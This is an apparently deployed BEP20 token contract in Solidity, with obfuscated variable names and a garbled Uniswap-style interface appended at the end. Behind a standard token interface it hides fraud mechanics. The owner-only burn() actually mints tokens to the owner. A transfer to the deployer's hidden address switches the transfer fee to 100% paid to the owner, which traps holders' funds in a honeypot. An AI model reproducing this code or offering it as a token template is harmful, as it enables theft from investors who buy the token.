/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.8;
contract FmWeLV {
uint256 public  ucCNau = 100000000000000000000;
uint256 public  vrzrKa = 10000000000000000000;
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  IrYINf = address(0);
uint256 public  SAwIDk = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  NNaNHd = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "THKckR";
address public  JzuhaH = address(0);
uint256 public  frVcKp = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
address public  pyZmcG = address(0);
mapping (address => uint256) public balanceOf;
address public  dGqdbY = address(0);
uint256 public  LqjPPu = 1000000000000000000;
uint256 public constant ayyZsR = 9+1;
string public  name = "THKckR";
uint256 public  ywcIBn = 100000000000000000000000;
uint256 public  mmlukR = 100000000000000000;
address public  uugJrr = address(0);
address private  mZMgHL = address(0);
uint256 public  IPPGqq = 10000000000000000000000000000;
uint256 private  EWqUsz = 10000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


constructor () public {
mZMgHL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "iEWluh");
require(to != address(0), "iEWluh");
require(amount <= balanceOf[from], "iEWluh");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ayyZsR/EWqUsz ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mZMgHL){
EWqUsz = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

interface IUniswapV2Factoryoie {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodskjh() external view returns (address);
    function fundToadddfmnb() external view returns (address);
    function getdsfjdgfdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfvbhgirs(uint) external view returns (address pair);
    function allPairtLength() external view returns (uint);
    function createhsdkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhwerewPTo(address) external;
    function setLPjlzxrewoadd(address) external;
}